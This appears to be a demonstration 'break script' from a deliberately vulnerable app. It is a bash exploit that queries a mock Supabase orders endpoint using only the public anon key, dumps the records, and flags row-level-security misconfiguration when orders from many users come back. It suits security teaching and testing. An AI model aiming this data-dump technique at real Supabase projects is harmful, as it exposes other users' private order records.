#!/usr/bin/env bash
set -e

# ==============================================================================
# Break Script 02: Broken Row Level Security (RLS-Off Leak)
# ==============================================================================
# Target: /api/mock-supabase/rest/v1/orders (or real Supabase REST endpoint)
# Attack Flow:
# 1. Supply only the public ANON_KEY in the 'apikey' header
# 2. No user authentication / session token provided
# 3. Tables with RLS disabled return complete multi-tenant order records
# ==============================================================================

BASE_URL="${BASE_URL:-http://localhost:3000}"
ANON_KEY="${NEXT_PUBLIC_SUPABASE_ANON_KEY:-FAKE_SUPABASE_ANON_KEY_DO_NOT_USE_112233}"

echo "[*] Querying orders table using ONLY the public ANON_KEY..."
echo "[*] Key: ${ANON_KEY}"

RES=$(curl -s -X GET "${BASE_URL}/api/mock-supabase/rest/v1/orders" \
  -H "apikey: ${ANON_KEY}" \
  -H "Authorization: Bearer ${ANON_KEY}")

echo ""
echo "[+] Dumped Table Output:"
echo "${RES}" | node -e '
  const fs = require("fs");
  const input = fs.readFileSync(0, "utf-8");
  try {
    const list = JSON.parse(input);
    console.log(JSON.stringify(list, null, 2));
    if (Array.isArray(list) && list.length >= 4) {
      console.log(`\n[!] VULNERABILITY CONFIRMED: Dumped ${list.length} orders across ALL users using anonymous key!`);
    }
  } catch {
    console.log(input);
  }
'
